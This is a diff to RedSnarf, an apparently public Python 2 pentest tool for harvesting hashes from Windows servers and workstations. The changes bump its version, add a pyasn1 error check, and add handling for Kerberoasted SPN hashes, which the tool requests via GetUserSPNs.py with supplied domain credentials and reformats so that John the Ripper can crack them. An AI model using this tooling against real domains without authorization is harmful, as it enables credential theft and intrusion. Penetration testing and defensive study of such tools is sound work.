@@ -1730,7 +1730,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4f", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4g", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2437,8 +2437,8 @@ if get_spn in yesanswers or get_spn=="l":
 				print colored("[+]Found pyasn1-0.1.8 installed",'green')			
 
 			print colored("[+]Configuration OK...",'yellow')
-			print colored("\n[+]Note",'yellow')
-			print colored("[+]To crack the extracted hashes with JtR,",'blue')
+
+			print colored("\n[+]To crack the extracted hashes with JtR,",'blue')
 			print colored("[+]JtR Jumbo Patch is needed which can be cloned from ",'blue')
 			print colored("[+]https://github.com/magnumripper/JohnTheRipper.git",'yellow')
 			print colored("\n[+]If building in VMWare the following will probably be needed",'blue')
@@ -2468,7 +2468,13 @@ if get_spn in yesanswers or get_spn=="l":
 			else:
 				proc = subprocess.Popen("GetUserSPNs.py "+domain_name+'/'+user+':'+passw+' -dc-ip '+targets[0] +" -request -outputfile "+outputpath+targets[0]+"/spns.txt", stdout=subprocess.PIPE,shell=True)
 				stdout_value = proc.communicate()[0]
-			
+						
+			#Check output to see whether SPN entries were found
+			if "Type position out of range" in stdout_value:
+				print colored("[-]Type position out of range, something has gone wrong with pyasn1...",'red')
+				print colored("[-]to fix remove pyasn1 folder from /usr/local/lib/python2.7/dist-packages/ and reinstall",'red')
+				sys.exit()
+
 			#Check output to see whether SPN entries were found
 			if "No entries found!" in stdout_value:
 				print colored("[-]No SPN entries were found!",'red')
@@ -2478,7 +2484,27 @@ if get_spn in yesanswers or get_spn=="l":
 			if not os.path.isfile(outputpath+targets[0]+"/spns.txt"):
 				print colored("[-]No SPNS's were output",'red')
 			else:
-				print colored("[-]SPN's output to "+outputpath+targets[0]+"/spns.txt",'green')
+				print colored("[+]To parse an SPN hash file use",'blue')
+				print colored("[+]./redsnarf.py -uSS y",'yellow')
+
+				print colored("\n[+]SPN's output to "+outputpath+targets[0]+"/spns.txt",'green')
+				
+				#Check for any broken hashes, if a : is found Jtr will bork changing it for . solves the issue.
+				#Read in hashes 
+				fo=open(outputpath+targets[0]+"/spns.txt","r").read()
+
+				#Detect : in hashes, if it is found those hashes won't be detected properly
+				if ":" in fo:
+					print colored("[-]We've got some corrupted hashes, replacing : for . which should fix them",'red')
+					#Replace all occurances of : with .
+					fo=fo.replace(":",".")
+					#Write to initial path appending .fix as not to overwrite the initial file
+					file = open(outputpath+targets[0]+"/spns.txt"+".fix","w") 
+					file.write (fo)
+					file.close()
+
+					#Print status message
+					print colored("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix",'green')
 
 			sys.exit()
 			
